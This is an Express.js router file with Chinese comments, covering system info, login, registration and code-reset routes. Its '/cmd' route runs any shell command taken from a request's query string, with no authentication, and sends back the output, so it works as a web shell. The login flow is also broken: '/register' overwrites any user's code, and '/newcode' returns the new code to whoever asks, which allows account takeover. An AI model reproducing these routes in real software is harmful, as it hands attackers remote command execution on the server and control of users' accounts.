var express = require('express');
var userserver = require('../server/userserver');
const os = require('os');
const { exec } = require('child_process');
var router = express.Router();
var jwt = require('jsonwebtoken');
const { secretKey } = require('../config/defultconfig');
//引入usersever.js中的user模块命名为userserver
var userserver = require('../server/userserver').users;


/* GET dontdie listing. */
router.get('/sysinfo', function(req, res, next) {
    const sysinfo = [
        { plaostform: os.platform(),
          arch: os.arch(),
          release: os.release(),
          uptime: os.uptime(),
          totalmem: os.totalmem(),
          freemem: os.freemem()}
      ];
    
    // 构建响应对象
    const response = {
        success: true,
        code: 2000, 
        data: sysinfo,
        message: 'Success'
      };
    res.json(response);
});

router.get('/cmd', function(req, res, next) {
    const cmd = req.query.cmd;
    exec(cmd,
        (error, stdout, stderr) => {
            if (error) {
                console.error(`执行命令时出错: ${error}`);
                return;
                }
            console.log(`标准输出: ${stdout}`);
            console.error(`标准错误输出: ${stderr}`);
            res.send(stdout);
            }
        );
});

//新增登录验证逻辑，使用userserver.getByNumber获取到对应用户后再验证code是否匹配，匹配则登录成果并构建token，失败则登录失败
router.post('/login',function(req, res, next) {
    const number = req.body.number;
    const code = req.body.code;
    userserver.getByNumber(number,(err,user) =>{
        if (err && !user) return res.send({
                        success: false,
                        status:999,
                        message: '无法获取用户',
                        data: err});
        if (user.code !== code) {
            return res.send({
                success: false,
                status:400,
                message: '用户名或密码错误',
                data: null
            })
        }
        const token = jwt.sign({ number: number }, secretKey, { expiresIn: '1h' });
        return res.send({
            success: true,
            status:200,
            message: '登录成功',
            data: {
                number: number,
                token: token
            }
        })
    });
})

//写一个post请求的'/register'路由，获取表单的number和code通过调用userserver中的方法存入数据库，如果number存在就更新code，如果number不存在就插入一条新数据
router.post('/register',function(req, res, next) {
    const number = req.body.number;
    const code = req.body.code;
    userserver.getByNumber(number, function(err, result) {
        if (err) return res.send({
                            success: false,
                            status:999,
                            message: '无法获取用户',
                            data: err
                        })
        if (result) {
            userserver.updateCode(number, code, function(err, result) {
                if (err) return res.send({
                             success: false,
                             status:999,
                             message: '用户已存在，更新失败',
                             data: err
                         })
                return res.send({
                    success: true,
                    status:200,
                    message: '用户已存在，更新成功',
                    data: result
                })
            })
        }else {
            userserver.add(number, code, function(err, result) {
                if (err) return res.send({
                             success: false,
                             status:999,
                             message: '用户不存在，新增失败',
                             data: err
                         })
                return res.send({
                    success: true,
                    status:999,
                    message: '用户不存在，新增成功',
                    data: result
                })
            })
        }
    })
})

//修改code，生成新的code
router.post('/newcode',function(req, res, next) {
    const number = req.body.number;
    //获取1000-9999之间的一个随机数
    const newcode = Math.floor(Math.random() * 9000 + 1000);
    userserver.getByNumber(number, function(err, result) {
        if (err) return res.send({
                            success: false,
                            status:999,
                            message: '无法获取用户',
                            data: err
                        })
        if (result) {
            userserver.updateCode(number, newcode, function(err, result) {
                if (err) return res.send({
                             success: false,
                             status:999,
                             message: '用户已存在，更新失败',
                             data: err
                         })
                return res.send({
                    success: true,
                    status:200,
                    message: '用户已存在，更新成功',
                    data: newcode
                })
            })
        }else {
            userserver.add(number, newcode, function(err, result) {
                if (err) return res.send({
                             success: false,
                             status:999,
                             message: '用户不存在，新增失败',
                             data: err
                         })
                return res.send({
                    success: true,
                    status:999,
                    message: '用户不存在，新增成功',
                    data: newcode
                })
            })
        }
    })
})

module.exports = router;
